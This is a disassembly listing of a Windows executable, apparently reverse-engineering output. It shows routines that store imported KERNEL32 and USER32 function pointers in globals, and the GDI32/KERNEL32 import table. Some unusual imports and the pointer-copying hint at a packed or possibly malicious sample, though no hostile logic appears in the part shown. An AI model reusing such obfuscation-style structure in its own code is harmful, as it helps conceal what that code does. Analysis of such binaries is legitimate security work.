		mov	edx, ds:CheckDlgButton
		mov	dword_44E244, edx
		mov	eax, ds:CreateWindowExW
		mov	dword_44E248, eax
		mov	ecx, ds:SystemParametersInfoW
		mov	dword_44E24C, ecx
		mov	edx, ds:RegisterClassW
		mov	dword_44E250, edx
		mov	eax, ds:SetDlgItemTextW
		mov	dword_44E254, eax
		mov	ecx, ds:GetDlgItemTextW
		mov	dword_44E258, ecx
		mov	edx, ds:MessageBoxIndirectW
		mov	dword_44E25C, edx
		mov	eax, ds:CharNextA
		mov	dword_44E260, eax
		mov	ecx, ds:CharUpperW
		mov	dword_44E264, ecx
		mov	edx, ds:CharPrevW
		mov	dword_44E268, edx
		mov	eax, ds:wvsprintfW
		mov	dword_44E26C, eax
		mov	ecx, ds:DispatchMessageW
		mov	dword_44E270, ecx
		mov	edx, ds:PeekMessageW
		mov	dword_44E274, edx
		mov	eax, ds:wsprintfA
		mov	dword_44E278, eax
		pop	ebp
		retn
sub_422EE0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_423090	proc near		; DATA XREF: .rdata:004243F4o
		push	ebp
		mov	ebp, esp
		mov	eax, ds:Sleep
		mov	dword_44E280, eax
		mov	ecx, ds:WaitForSingleObject
		mov	dword_44E284, ecx
		mov	edx, ds:GetExitCodeProcess
		mov	dword_44E288, edx
		mov	eax, ds:CloseHandle
		mov	dword_44E28C, eax
		mov	ecx, ds:SetFileAttributesW
		mov	dword_44E290, ecx
		mov	edx, ds:InitializeCriticalSection
		mov	dword_44E294, edx
		mov	eax, ds:CreateEventA
		mov	dword_44E298, eax
		mov	ecx, ds:CreateThread
		mov	dword_44E29C, ecx
		mov	edx, ds:DeleteCriticalSection
		mov	dword_44E2A0, edx
		mov	eax, ds:EnterCriticalSection
		mov	dword_44E2A4, eax
		mov	ecx, ds:LeaveCriticalSection
		mov	dword_44E2A8, ecx
		mov	edx, ds:SetEvent
		mov	dword_44E2AC, edx
		mov	eax, ds:GetCommandLineW
		mov	dword_44E2B0, eax
		mov	ecx, ds:CreateProcessW
		mov	dword_44E2B4, ecx
		mov	edx, ds:CompareStringW
		mov	dword_44E2B8, edx
		mov	eax, ds:LocalFree
		mov	dword_44E2BC, eax
		mov	ecx, ds:QueryDosDeviceW
		mov	dword_44E2C0, ecx
		mov	edx, ds:GetLogicalDriveStringsW
		mov	dword_44E2C4, edx
		mov	eax, ds:GetDiskFreeSpaceExW
		mov	dword_44E2C8, eax
		mov	ecx, ds:GetDriveTypeW
		mov	dword_44E2CC, ecx
		mov	edx, ds:CreateFileW
		mov	dword_44E2D0, edx
		mov	eax, ds:DeviceIoControl
		mov	dword_44E2D4, eax
		mov	ecx, ds:SetErrorMode
		mov	dword_44E2D8, ecx
		mov	edx, ds:CreateDirectoryW
		mov	dword_44E2DC, edx
		mov	eax, ds:RemoveDirectoryW
		mov	dword_44E2E0, eax
		mov	ecx, ds:MoveFileExW
		mov	dword_44E2E4, ecx
		mov	edx, ds:LoadLibraryW
		mov	dword_44E2E8, edx
		mov	eax, ds:GetProcAddress
		mov	dword_44E2EC, eax
		mov	ecx, ds:GetSystemDirectoryW
		mov	dword_44E2F0, ecx
		mov	edx, ds:GetVersion
		mov	dword_44E2F4, edx
		mov	eax, ds:GetLastError
		mov	dword_44E2F8, eax
		mov	ecx, ds:SetEnvironmentVariableW
		mov	dword_44E2FC, ecx
		mov	edx, ds:ExitThread
		mov	dword_44E300, edx
		mov	eax, ds:GetTickCount
		mov	dword_44E304, eax
		mov	ecx, ds:GetEnvironmentVariableW
		mov	dword_44E308, ecx
		mov	edx, ds:GetModuleHandleW
		mov	dword_44E30C, edx
		mov	eax, ds:lstrlenW
		mov	dword_44E310, eax
		mov	ecx, ds:WaitForMultipleObjects
		mov	dword_44E314, ecx
		mov	edx, ds:ResetEvent
		mov	dword_44E318, edx
		mov	eax, ds:GetSystemInfo
		mov	dword_44E31C, eax
		mov	ecx, ds:FileTimeToSystemTime
		mov	dword_44E320, ecx
		mov	edx, ds:FileTimeToLocalFileTime
		mov	dword_44E324, edx
		mov	eax, ds:FileTimeToDosDateTime
		mov	dword_44E328, eax
		mov	ecx, ds:SetFileTime
		mov	dword_44E32C, ecx
		mov	edx, ds:LocalFileTimeToFileTime
		mov	dword_44E330, edx
		mov	eax, ds:DosDateTimeToFileTime
		mov	dword_44E334, eax
		mov	ecx, ds:SetEndOfFile
		mov	dword_44E338, ecx
		mov	edx, ds:DuplicateHandle
		mov	dword_44E33C, edx
		mov	eax, ds:ReadFile
		mov	dword_44E340, eax
		mov	ecx, ds:SetFilePointerEx
		mov	dword_44E344, ecx
		mov	edx, ds:GlobalFree
		mov	dword_44E348, edx
		mov	eax, ds:GlobalAlloc
		mov	dword_44E34C, eax
		mov	ecx, ds:GetCommandLineA
		mov	dword_44E350, ecx
		mov	edx, ds:HeapSetInformation
		mov	dword_44E354, edx
		mov	eax, ds:GetStartupInfoW
		mov	dword_44E358, eax
		mov	ecx, ds:SetUnhandledExceptionFilter
		mov	dword_44E35C, ecx
		mov	edx, ds:ExitProcess
		mov	dword_44E360, edx
		mov	eax, ds:WriteFile
		mov	dword_44E364, eax
		mov	ecx, ds:GetStdHandle
		mov	dword_44E368, ecx
		mov	edx, ds:GetModuleFileNameW
		mov	dword_44E36C, edx
		mov	eax, ds:GetModuleFileNameA
		mov	dword_44E370, eax
		mov	ecx, ds:FreeEnvironmentStringsW
		mov	dword_44E374, ecx
		mov	edx, ds:WideCharToMultiByte
		mov	dword_44E378, edx
		mov	eax, ds:GetEnvironmentStringsW
		mov	dword_44E37C, eax
		mov	ecx, ds:SetHandleCount
		mov	dword_44E380, ecx
		mov	edx, ds:InitializeCriticalSectionAndSpinCount
		mov	dword_44E384, edx
		mov	eax, ds:GetFileType
		mov	dword_44E388, eax
		mov	ecx, ds:TlsAlloc
		mov	dword_44E38C, ecx
		mov	edx, ds:TlsGetValue
		mov	dword_44E390, edx
		mov	eax, ds:TlsSetValue
		mov	dword_44E394, eax
		mov	ecx, ds:TlsFree
		mov	dword_44E398, ecx
		mov	edx, ds:SetLastError
		mov	dword_44E39C, edx
		mov	eax, ds:GetCurrentThreadId
		mov	dword_44E3A0, eax
		mov	ecx, ds:HeapCreate
		mov	dword_44E3A4, ecx
		mov	edx, ds:QueryPerformanceCounter
		mov	dword_44E3A8, edx
		mov	eax, ds:GetCurrentProcessId
		mov	dword_44E3AC, eax
		mov	ecx, ds:GetSystemTimeAsFileTime
		mov	dword_44E3B0, ecx
		mov	edx, ds:TerminateProcess
		mov	dword_44E3B4, edx
		mov	eax, ds:GetCurrentProcess
		mov	dword_44E3B8, eax
		mov	ecx, ds:UnhandledExceptionFilter
		mov	dword_44E3BC, ecx
		mov	edx, ds:IsDebuggerPresent
		mov	dword_44E3C0, edx
		mov	eax, ds:HeapFree
		mov	dword_44E3C4, eax
		mov	ecx, ds:GetCPInfo
		mov	dword_44E3C8, ecx
		mov	edx, ds:GetACP
		mov	dword_44E3CC, edx
		mov	eax, ds:GetOEMCP
		mov	dword_44E3D0, eax
		mov	ecx, ds:IsValidCodePage
		mov	dword_44E3D4, ecx
		mov	edx, ds:HeapAlloc
		mov	dword_44E3D8, edx
		mov	eax, ds:LCMapStringW
		mov	dword_44E3DC, eax
		mov	ecx, ds:__imp_RtlUnwind
		mov	dword_44E3E0, ecx
		mov	edx, ds:SetFilePointer
		mov	dword_44E3E4, edx
		mov	eax, ds:GetConsoleCP
		mov	dword_44E3E8, eax
		mov	ecx, ds:GetConsoleMode
		mov	dword_44E3EC, ecx
		mov	edx, ds:MultiByteToWideChar
		mov	dword_44E3F0, edx
		mov	eax, ds:GetStringTypeW
		mov	dword_44E3F4, eax
		mov	ecx, ds:HeapSize
		mov	dword_44E3F8, ecx
		mov	edx, ds:HeapReAlloc
		mov	dword_44E3FC, edx
		mov	eax, ds:IsProcessorFeaturePresent
		mov	dword_44E400, eax
		mov	ecx, ds:SetStdHandle
		mov	dword_44E404, ecx
		mov	edx, ds:WriteConsoleW
		mov	dword_44E408, edx
		mov	eax, ds:FlushFileBuffers
		mov	dword_44E40C, eax
		mov	ecx, ds:CreateFileA
		mov	dword_44E410, ecx
		mov	edx, ds:GetLocalTime
		mov	dword_44E414, edx
		mov	eax, ds:GetComputerNameW
		mov	dword_44E418, eax
		mov	ecx, ds:lstrlenA
		mov	dword_44E41C, ecx
		mov	edx, ds:FormatMessageW
		mov	dword_44E420, edx
		mov	eax, ds:GetSystemTime
		mov	dword_44E424, eax
		mov	ecx, ds:GetTimeZoneInformation
		mov	dword_44E428, ecx
		mov	edx, ds:SystemTimeToTzSpecificLocalTime
		mov	dword_44E42C, edx
		mov	eax, ds:DeleteFileW
		mov	dword_44E430, eax
		mov	ecx, ds:GetFileAttributesW
		mov	dword_44E434, ecx
		mov	edx, ds:FindFirstFileW
		mov	dword_44E438, edx
		mov	eax, ds:FindNextFileW
		mov	dword_44E43C, eax
		mov	ecx, ds:FindClose
		mov	dword_44E440, ecx
		mov	edx, ds:GetCurrentDirectoryW
		mov	dword_44E444, edx
		mov	eax, ds:SetCurrentDirectoryW
		mov	dword_44E448, eax
		mov	ecx, ds:ExpandEnvironmentStringsW
		mov	dword_44E44C, ecx
		mov	edx, ds:GetProcessHeap
		mov	dword_44E450, edx
		mov	eax, ds:RaiseException
		mov	dword_44E454, eax
		pop	ebp
		retn
sub_423090	endp

; ---------------------------------------------------------------------------
		align 40h
		dd 280h	dup(?)
_text		ends

; Section 3. (virtual address 00024000)
; Virtual size			: 00007FD6 (  32726.)
; Section size in file		: 00008000 (  32768.)
; Offset to raw	data for section: 00022000
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from GDI32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; BOOL __stdcall FillRgn(HDC hdc, HRGN hrgn, HBRUSH hbr)
		extrn FillRgn:dword	; CODE XREF: sub_40FF80+A2p
					; DATA XREF: sub_40FF80+A2r ...
; int __stdcall	GetObjectA(HANDLE h, int c, LPVOID pv)
		extrn GetObjectA:dword	; CODE XREF: sub_40FC00+31Ap
					; DATA XREF: sub_40FC00+31Ar
; BOOL __stdcall SetICMProfileA(HDC hdc, LPSTR lpFileName)
		extrn SetICMProfileA:dword ; CODE XREF:	sub_40F3D0+118p
					; WinMain(x,x,x,x)+54B0p
					; DATA XREF: ...
; int __stdcall	SaveDC(HDC hdc)
		extrn SaveDC:dword	; CODE XREF: sub_40F3D0+2C0p
					; DATA XREF: sub_40F3D0+2C0r
; BOOL __stdcall PlayEnhMetaFile(HDC hdc, HENHMETAFILE hmf, const RECT *lprect)
		extrn PlayEnhMetaFile:dword ; CODE XREF: sub_40F3D0+399p
					; DATA XREF: sub_40F3D0+399r
; BOOL __stdcall SetWindowOrgEx(HDC hdc, int x,	int y, LPPOINT lppt)
		extrn SetWindowOrgEx:dword ; CODE XREF:	.text:0040EA3Cp
					; DATA XREF: .text:0040EA3Cr
; COLORREF __stdcall GetDCBrushColor(HDC hdc)
		extrn GetDCBrushColor:dword ; CODE XREF: sub_40E710+Bp
					; DATA XREF: sub_40E710+Br
; BOOL __stdcall GetCharABCWidthsW(HDC hdc, UINT wFirst, UINT wLast, LPABC lpABC)
		extrn GetCharABCWidthsW:dword ;	CODE XREF: sub_409DF0+2AEp
					; DATA XREF: sub_409DF0+2AEr
; HPEN __stdcall CreatePen(int iStyle, int cWidth, COLORREF color)
		extrn CreatePen:dword	; CODE XREF: sub_409DF0+319p
					; DATA XREF: sub_409DF0+319r
; int __stdcall	GetTextCharset(HDC hdc)
		extrn GetTextCharset:dword ; CODE XREF:	sub_409DF0+356p
					; sub_409DF0+4796p
					; DATA XREF: ...
; int __stdcall	Escape(HDC hdc,	int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut)
		extrn Escape:dword	; CODE XREF: sub_409DF0+53Ep
					; DATA XREF: sub_409DF0+53Er
; BOOL __stdcall StrokeAndFillPath(HDC hdc)
		extrn StrokeAndFillPath:dword ;	CODE XREF: sub_409DF0+83Dp
					; DATA XREF: sub_409DF0+83Dr
; int __stdcall	GetArcDirection(HDC hdc)
		extrn GetArcDirection:dword ; CODE XREF: sub_409DF0+9A8p
					; DATA XREF: sub_409DF0+9A8r
; HCOLORSPACE __stdcall	SetColorSpace(HDC hdc, HCOLORSPACE hcs)
		extrn SetColorSpace:dword ; CODE XREF: sub_409DF0+E0Cp
					; DATA XREF: sub_409DF0+E0Cr
; COLORREF __stdcall SetDCPenColor(HDC hdc, COLORREF color)
		extrn SetDCPenColor:dword ; CODE XREF: sub_409DF0+10AEp
					; DATA XREF: sub_409DF0+10AEr
; UINT __stdcall GetEnhMetaFilePixelFormat(HENHMETAFILE	hemf, UINT cbBuffer, PIXELFORMATDESCRIPTOR *ppfd)
		extrn GetEnhMetaFilePixelFormat:dword ;	CODE XREF: sub_409DF0+10FEp
					; DATA XREF: sub_409DF0+10FEr
; BOOL __stdcall Ellipse(HDC hdc, int left, int	top, int right,	int bottom)
		extrn Ellipse:dword	; CODE XREF: sub_409DF0+138Ep
					; DATA XREF: sub_409DF0+138Er
; BOOL __stdcall GetCharABCWidthsFloatA(HDC hdc, UINT iFirst, UINT iLast, LPABCFLOAT lpABC)
		extrn GetCharABCWidthsFloatA:dword ; CODE XREF:	sub_409DF0+4895p
					; DATA XREF: sub_409DF0+4895r
; BOOL __stdcall GetTextMetricsW(HDC hdc, LPTEXTMETRICW	lptm)
		extrn GetTextMetricsW:dword ; CODE XREF: .text:00408F4Dp
					; DATA XREF: .text:00408F4Dr
; BOOL __stdcall GdiComment(HDC	hdc, UINT nSize, const BYTE *lpData)
		extrn GdiComment:dword	; CODE XREF: .text:0040903Dp
					; DATA XREF: .text:0040903Dr
; HENHMETAFILE __stdcall CopyEnhMetaFileW(HENHMETAFILE hEnh, LPCWSTR lpFileName)
		extrn CopyEnhMetaFileW:dword ; CODE XREF: .text:0040920Dp
					; DATA XREF: .text:0040920Dr
; BOOL __stdcall Polyline(HDC hdc, const POINT *apt, int cpt)
		extrn Polyline:dword	; CODE XREF: sub_407A90+31p
					; DATA XREF: sub_407A90+31r
; HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h)
		extrn SelectObject:dword ; CODE	XREF: sub_407380+CCp
					; DATA XREF: sub_407380+CCr
; UINT __stdcall GetEnhMetaFileDescriptionA(HENHMETAFILE hemf, UINT cchBuffer, LPSTR lpDescription)
		extrn GetEnhMetaFileDescriptionA:dword ; CODE XREF: .text:00407022p
					; DATA XREF: .text:00407022r
; BOOL __stdcall GetBitmapDimensionEx(HBITMAP hbit, LPSIZE lpsize)
		extrn GetBitmapDimensionEx:dword ; CODE	XREF: sub_402C40+306p
					; DATA XREF: sub_402C40+306r
; BOOL __stdcall BitBlt(HDC hdc, int x,	int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop)
		extrn BitBlt:dword	; CODE XREF: sub_402520+251p
					; DATA XREF: sub_402520+251r
; int __stdcall	EnumICMProfilesA(HDC hdc, ICMENUMPROCA proc, LPARAM param)
		extrn EnumICMProfilesA:dword ; CODE XREF: .text:0040249Fp
					; DATA XREF: .text:0040249Fr
; COLORREF __stdcall GetTextColor(HDC hdc)
		extrn GetTextColor:dword ; CODE	XREF: .text:00402267p
					; DATA XREF: .text:00402267r
; int __stdcall	StartDocW(HDC hdc, const DOCINFOW *lpdi)
		extrn StartDocW:dword	; CODE XREF: .text:00402365p
					; DATA XREF: .text:00402365r
; BOOL __stdcall GetLogColorSpaceA(HCOLORSPACE hColorSpace, LPLOGCOLORSPACEA lpBuffer, DWORD nSize)
		extrn GetLogColorSpaceA:dword ;	CODE XREF: WinMain(x,x,x,x)+11Cp
					; DATA XREF: WinMain(x,x,x,x)+11Cr

;
; Imports from KERNEL32.dll
;
; BOOL __stdcall SetEvent(HANDLE hEvent)
		extrn SetEvent:dword	; DATA XREF: sub_423090+7Fr
					; .rdata:0042AA4Co
; int __stdcall	CompareStringW(LCID Locale, DWORD dwCmpFlags, PCNZWCH lpString1, int cchCount1,	PCNZWCH	lpString2, int cchCount2)
		extrn CompareStringW:dword ; DATA XREF:	sub_423090+A1r
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn LocalFree:dword	; DATA XREF: sub_423090+ADr
; DWORD	__stdcall QueryDosDeviceW(LPCWSTR lpDeviceName,	LPWSTR lpTargetPath, DWORD ucchMax)
		extrn QueryDosDeviceW:dword ; DATA XREF: sub_423090+B7r
; DWORD	__stdcall GetLogicalDriveStringsW(DWORD	nBufferLength, LPWSTR lpBuffer)
		extrn GetLogicalDriveStringsW:dword ; DATA XREF: sub_423090+C3r
; BOOL __stdcall GetDiskFreeSpaceExW(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes)
		extrn GetDiskFreeSpaceExW:dword	; DATA XREF: sub_423090+CFr
; UINT __stdcall GetDriveTypeW(LPCWSTR lpRootPathName)
		extrn GetDriveTypeW:dword ; DATA XREF: sub_423090+D9r
; HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD	dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
		extrn CreateFileW:dword	; DATA XREF: sub_423090+E5r
; BOOL __stdcall DeviceIoControl(HANDLE	hDevice, DWORD dwIoControlCode,	LPVOID lpInBuffer, DWORD nInBufferSize,	LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED	lpOverlapped)
		extrn DeviceIoControl:dword ; DATA XREF: sub_423090+F1r
; BOOL __stdcall CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes)
		extrn CreateDirectoryW:dword ; DATA XREF: sub_423090+107r
; BOOL __stdcall MoveFileExW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName,	DWORD dwFlags)
		extrn MoveFileExW:dword	; DATA XREF: sub_423090+11Dr
; void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn LeaveCriticalSection:dword ; CODE	XREF: __unlock+Fp
					; DATA XREF: __unlock+Fr ...
; BOOL __stdcall SetEnvironmentVariableW(LPCWSTR lpName, LPCWSTR lpValue)
		extrn SetEnvironmentVariableW:dword ; DATA XREF: sub_423090+161r
; void __stdcall ExitThread(DWORD dwExitCode)
		extrn ExitThread:dword	; DATA XREF: sub_423090+16Dr
; DWORD	__stdcall GetTickCount()
		extrn GetTickCount:dword ; CODE	XREF: ___security_init_cookie+53p
					; DATA XREF: ___security_init_cookie+53r ...
; DWORD	__stdcall GetEnvironmentVariableW(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize)
		extrn GetEnvironmentVariableW:dword ; DATA XREF: sub_423090+183r
; DWORD	__stdcall WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles,	BOOL bWaitAll, DWORD dwMilliseconds)
		extrn WaitForMultipleObjects:dword ; DATA XREF:	sub_423090+1A5r
; BOOL __stdcall ResetEvent(HANDLE hEvent)
		extrn ResetEvent:dword	; DATA XREF: sub_423090+1B1r
; void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)
		extrn GetSystemInfo:dword ; DATA XREF: sub_423090+1BDr
; BOOL __stdcall FileTimeToSystemTime(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime)
		extrn FileTimeToSystemTime:dword ; DATA	XREF: sub_423090+1C7r
; BOOL __stdcall FileTimeToLocalFileTime(const FILETIME	*lpFileTime, LPFILETIME	lpLocalFileTime)
		extrn FileTimeToLocalFileTime:dword ; DATA XREF: sub_423090+1D3r
; BOOL __stdcall FileTimeToDosDateTime(const FILETIME *lpFileTime, LPWORD lpFatDate, LPWORD lpFatTime)
		extrn FileTimeToDosDateTime:dword ; DATA XREF: sub_423090+1DFr
; BOOL __stdcall SetFileTime(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime)
		extrn SetFileTime:dword	; DATA XREF: sub_423090+1E9r
; void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn EnterCriticalSection:dword ; CODE	XREF: __lock+2Ap
					; DATA XREF: __lock+2Ar ...
; void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn DeleteCriticalSection:dword ; CODE XREF: __mtterm-3D30p
					; __mtterm-3D06p
					; DATA XREF: ...
; HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState,	LPCSTR lpName)
		extrn CreateEventA:dword ; DATA	XREF: sub_423090+47r
; void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
		extrn InitializeCriticalSection:dword ;	DATA XREF: sub_423090+3Br
; BOOL __stdcall SetFileAttributesW(LPCWSTR lpFileName,	DWORD dwFileAttributes)
		extrn SetFileAttributesW:dword ; DATA XREF: sub_423090+2Fr
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; CODE XREF: __crt_waiting_on_module_handle+Cp
					; __malloc_crt+21p ...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: ___tmainCRTStartup+15p
					; __ioinit+15p
					; DATA XREF: ...
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: ___sbh_free_block+249p
					; ___sbh_free_block+2A4p
					; DATA XREF: ...
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: ___sbh_alloc_new_region+77p
					; ___sbh_alloc_new_group+54p
					; DATA XREF: ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn FreeEnvironmentStringsA:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+111p
					; ___crtGetEnvironmentStringsA+12Ap
					; DATA XREF: ...
; LPCH __stdcall GetEnvironmentStrings()
		extrn GetEnvironmentStrings:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_41AD53p
					; DATA XREF: ___crtGetEnvironmentStringsA:loc_41AD53r
; LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend)
		extrn InterlockedIncrement:dword ; CODE	XREF: __initptd+85p
					; ___updatetmbcinfo+84p ...
; LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend)
		extrn InterlockedDecrement:dword ; CODE	XREF: _freefls(x)+9Ep
					; ___updatetmbcinfo+59p ...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn LCMapStringA:dword
					; CODE XREF: __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+2A9p
					; __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+31Bp ...
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn GetStringTypeA:dword
					; CODE XREF: __crtGetStringTypeA_stat(localeinfo_struct	*,ulong,char const *,int,ushort	*,int,int,int)+193p
					; DATA XREF: __crtGetStringTypeA_stat(localeinfo_struct	*,ulong,char const *,int,ushort	*,int,int,int)+193r
; int __stdcall	GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn GetLocaleInfoA:dword ; CODE XREF:	___ansicp+24p
					; DATA XREF: ___ansicp+24r
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: _realloc+17Bp
					; _realloc+208p ...
; LPWSTR __stdcall lstrcatW(LPWSTR lpString1, LPCWSTR lpString2)
		extrn lstrcatW:dword	; DATA XREF: sub_422C60+D9r
; DWORD	__stdcall GetTapeParameters(HANDLE hDevice, DWORD dwOperation, LPDWORD lpdwSize, LPVOID	lpTapeInformation)
		extrn GetTapeParameters:dword ;	CODE XREF: .text:00402929p
					; DATA XREF: .text:00402929r
; BOOL __stdcall FreeResource(HGLOBAL hResData)
		extrn FreeResource:dword ; CODE	XREF: .text:004075C8p
					; DATA XREF: .text:004075C8r
; DWORD	__stdcall WTSGetActiveConsoleSessionId()
		extrn WTSGetActiveConsoleSessionId:dword ; CODE	XREF: sub_407820+117p
					; DATA XREF: sub_407820+117r
; void __stdcall GlobalUnfix(HGLOBAL hMem)
		extrn GlobalUnfix:dword	; CODE XREF: sub_408140+10Cp
					; DATA XREF: sub_408140+10Cr
; BOOL __stdcall GetNumaAvailableMemoryNode(UCHAR Node,	PULONGLONG AvailableBytes)
		extrn GetNumaAvailableMemoryNode:dword ; CODE XREF: sub_408140+BEp
					; DATA XREF: sub_408140+BEr
; SIZE_T __stdcall LocalShrink(HLOCAL hMem, UINT cbNewSize)
		extrn LocalShrink:dword	; CODE XREF: sub_408650+B1p
					; DATA XREF: sub_408650+B1r
; BOOL __stdcall GetCommTimeouts(HANDLE	hFile, LPCOMMTIMEOUTS lpCommTimeouts)
		extrn GetCommTimeouts:dword ; CODE XREF: sub_409DF0+117Ep
					; DATA XREF: sub_409DF0+117Er
; BOOL __stdcall IsWow64Process(HANDLE hProcess, PBOOL Wow64Process)
		extrn IsWow64Process:dword ; CODE XREF:	sub_409DF0+760p
					; DATA XREF: sub_409DF0+760r
; BOOL __stdcall GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode)
		extrn GetExitCodeThread:dword ;	CODE XREF: sub_409DF0+693p
					; DATA XREF: sub_409DF0+693r
; DWORD	__stdcall GetPriorityClass(HANDLE hProcess)
		extrn GetPriorityClass:dword ; CODE XREF: sub_40EDD0+BCp
					; DATA XREF: sub_40EDD0+BCr
; BOOL __stdcall RequestWakeupLatency(LATENCY_TIME latency)
		extrn RequestWakeupLatency:dword ; CODE	XREF: sub_40F3D0+2D7p
					; DATA XREF: sub_40F3D0+2D7r
; LPSTR	__stdcall lstrcpynA(LPSTR lpString1, LPCSTR lpString2, int iMaxLength)
		extrn lstrcpynA:dword	; DATA XREF: sub_422C60+267r
; BOOL __stdcall DeleteFileW(LPCWSTR lpFileName)
		extrn DeleteFileW:dword	; DATA XREF: sub_422C60+25Br
					; sub_423090+4CBr
; HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
		extrn FindFirstFileW:dword ; DATA XREF:	sub_422C60+24Fr
					; sub_423090+4E1r
; BOOL __stdcall FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
		extrn FindNextFileW:dword ; DATA XREF: sub_422C60+245r
					; sub_423090+4EDr
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_422C60+239r
					; sub_423090+4F7r
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; DATA XREF:	sub_422C60+22Dr
					; sub_423090+3F3r
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword
					; CODE XREF: __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+D0p
					; __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+13Cp ...
; BOOL __stdcall ReadFile(HANDLE hFile,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; DATA XREF: sub_422C60+217r
					; sub_423090+223r
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: __NMSG_WRITE+1A0p
					; DATA XREF: __NMSG_WRITE+1A0r	...
; int __stdcall	MulDiv(int nNumber, int	nNumerator, int	nDenominator)
		extrn MulDiv:dword	; DATA XREF: sub_422C60+201r
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; DATA XREF: sub_422C60+1F5r
					; sub_423090+491r
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+93p
					; ___crtGetEnvironmentStringsA+B6p ...
; DWORD	__stdcall GetPrivateProfileStringW(LPCWSTR lpAppName, LPCWSTR lpKeyName, LPCWSTR lpDefault, LPWSTR lpReturnedString, DWORD nSize, LPCWSTR lpFileName)
		extrn GetPrivateProfileStringW:dword ; DATA XREF: sub_422C60+1DFr
; BOOL __stdcall WritePrivateProfileStringW(LPCWSTR lpAppName, LPCWSTR lpKeyName, LPCWSTR lpString, LPCWSTR lpFileName)
		extrn WritePrivateProfileStringW:dword ; DATA XREF: sub_422C60+1D3r
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn FreeLibrary:dword	; DATA XREF: sub_422C60+1C7r
